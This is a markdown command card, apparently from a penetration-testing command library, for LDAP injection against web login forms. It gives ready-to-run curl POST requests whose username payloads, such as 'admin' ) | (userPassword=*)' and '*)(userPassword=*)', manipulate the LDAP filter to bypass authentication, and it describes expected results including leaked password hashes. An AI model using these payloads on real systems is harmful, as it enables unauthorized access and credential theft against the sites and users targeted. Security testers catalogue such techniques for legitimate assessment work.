---
type: command
executor: bash
data: >-
  curl -X POST http://target.example.com/login -d "username=admin' ) |
  (userPassword=*) &password=any"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - ldap-injection
verified: true
validated: true
---

# inject-ldap-userpassword-payload

## Command

```bash
curl -X POST $_TARGET_URL -d "username=$_INJECTED_USERNAME &password=$_PASSWORD"
```

## Description

This command tests LDAP injection by sending a crafted payload targeting the userPassword attribute in a login request. It uses curl to simulate a POST request with an injected username that manipulates the LDAP filter for authentication bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The login endpoint URL of the vulnerable application | Yes |
| $_INJECTED_USERNAME | The injection payload, e.g., admin' ) | (userPassword=*) | Yes |
| $_PASSWORD | Dummy password value (ignored due to injection) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.example.com/login -d "username=admin' ) | (userPassword=*) &password=any"
```

### Advanced Usage

```bash
curl -X POST http://target.example.com/login -d "username=*)(userPassword=*) &password=any" -v
```

## Expected Output

HTTP 200 OK with login success or redirected to dashboard, indicating bypass. May include LDAP dump if query is fully manipulated, e.g., {"users": [{"cn": "admin", "userPassword": "{SSHA}hash"}]}. Errors like LDAP invalid filter confirm partial success.

## Related

- [[procedures/LDAP-Injection-Exploiting-userPassword-Attribute]]
- [[commands/inject-ldap-userpassword-encoding]]
